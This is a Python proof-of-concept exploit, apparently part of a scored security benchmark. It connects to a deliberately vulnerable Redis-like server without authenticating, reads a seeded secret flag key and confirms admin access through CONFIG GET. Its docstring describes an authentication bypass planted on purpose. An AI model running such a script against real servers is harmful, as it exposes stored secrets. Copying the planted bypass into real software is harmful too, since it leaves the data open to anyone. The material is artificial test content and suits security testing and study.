#!/usr/bin/env python3
"""
PoC #1: AUTH gate not enforced -> secret disclosure (KVS_FLAG)
----------------------------------------------------------------------------
Location: handleConn() in main.go (every session is marked authenticated up
front — see VULN #1) and Session.dispatch() in session.go (the AUTH gate only
refuses commands while a session is unauthenticated, which now never happens).

A password IS configured (KVS_REQUIREPASS is set) and cmdAuth() still validates
it for clients that send AUTH — but because every connection is marked
authenticated up front, the AUTH gate never fires, so an unauthenticated client
that only speaks RESP gets full read/write/admin access regardless of the
configured password. This is the root trust bug that makes PoCs #2, #3, #4, and
#5 reachable by anyone who can open a socket.

The scoreable impact (per the repo's scoring contract in ../../README.md) is
secret disclosure: at startup the server seeds this deployment's real
per-deployment secret, KVS_FLAG (minted by ../../generate-secrets.sh), into
its own keyspace under `fleet:control:flag` (see Store.Seed() in store.go /
main()). An unauthenticated client just GETs that key and reads the minted
secret straight back out — a genuine auth-bypass disclosure of a value the
harness minted at deploy time, not one this PoC planted. THAT is the pass/fail
condition below. The self-set round-trip and CONFIG GET are kept as supporting
evidence that the same no-auth connection has full read/write + admin.

Run: python3 01_no_auth_default.py [host] [port]
"""
import os
import socket
import sys
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
# Key the server seeds the per-deployment secret into (KVS_FLAG_KEY in main.go).
FLAG_KEY = os.environ.get("KVS_FLAG_KEY", "fleet:control:flag")
# What the seeded secret should be, if a harness told us. Only used to assert
# the exact value; the disclosure itself doesn't depend on knowing it.
EXPECTED_FLAG = os.environ.get("KVS_FLAG", "")


def encode(*parts):
    out = b"*%d\r\n" % len(parts)
    for p in parts:
        p = p.encode() if isinstance(p, str) else p
        out += b"$%d\r\n%s\r\n" % (len(p), p)
    return out


def read_reply(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def cmd(sock, *parts):
    sock.sendall(encode(*parts))
    return read_reply(sock)


def parse_bulk(reply):
    """Payload of a RESP bulk string ($<len>\\r\\n<data>\\r\\n), or None for a
    nil/non-bulk reply."""
    if not reply or reply[:1] != b"$":
        return None
    try:
        header, rest = reply.split(b"\r\n", 1)
        n = int(header[1:])
    except ValueError:
        return None
    if n < 0:
        return None
    return rest[:n]


def main():
    token = uuid.uuid4().hex[:12]
    s = socket.create_connection((HOST, PORT), timeout=10)

    # No AUTH is ever sent below. Each of these replies is a single RESP line
    # (a simple string or a one-shot bulk), which the minimal read_reply() above
    # consumes cleanly. CONFIG GET returns a multi-line array, so it goes LAST —
    # after the scoreable flag read — to avoid desyncing the stream.
    set_reply = cmd(s, "SET", f"poc1:{token}", token)
    get_reply = cmd(s, "GET", f"poc1:{token}")
    # The scoreable leg: read the deployment's seeded secret with no credentials.
    flag_reply = cmd(s, "GET", FLAG_KEY)
    stolen = parse_bulk(flag_reply)
    cfg_reply = cmd(s, "CONFIG", "GET", "dir")
    s.close()

    print(f"[*] SET (no auth)            -> {set_reply!r}")
    print(f"[*] GET (no auth)            -> {get_reply!r}")
    print(f"[*] CONFIG GET dir           -> {cfg_reply!r}")
    print(f"[*] GET {FLAG_KEY} (no auth) -> {flag_reply!r}  (value: {stolen!r})")

    ok_write = set_reply.startswith(b"+OK")
    ok_read = token.encode() in get_reply
    ok_admin = cfg_reply.startswith(b"*")  # array reply == command accepted

    if not (ok_write and ok_read and ok_admin):
        print("[-] Server enforced authentication (VULN #1 appears fixed — the "
              "AUTH gate now refuses unauthenticated commands)")
        return 1
    print("[+] Unauthenticated read/write AND admin (CONFIG) confirmed with no AUTH")

    # Score condition: did the no-auth read disclose a real, minted KVS_FLAG?
    if not stolen:
        print(f"[-] No secret seeded at {FLAG_KEY!r}; nothing minted to disclose here.")
        return 1
    if stolen == token.encode():
        print("[-] Read back only this PoC's own token, not a seeded deployment secret.")
        return 1
    if EXPECTED_FLAG and stolen != EXPECTED_FLAG.encode():
        print(f"[-] Disclosed {stolen!r} but the expected KVS_FLAG is "
              f"{EXPECTED_FLAG!r} — value mismatch, not a clean disclosure.")
        return 1

    print("[+] SCORED: unauthenticated GET disclosed the deployment's real")
    print(f"    KVS_FLAG secret ({stolen.decode(errors='replace')!r}) — no AUTH, no")
    print("    foothold, just an open keyspace handing a minted secret to anyone.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
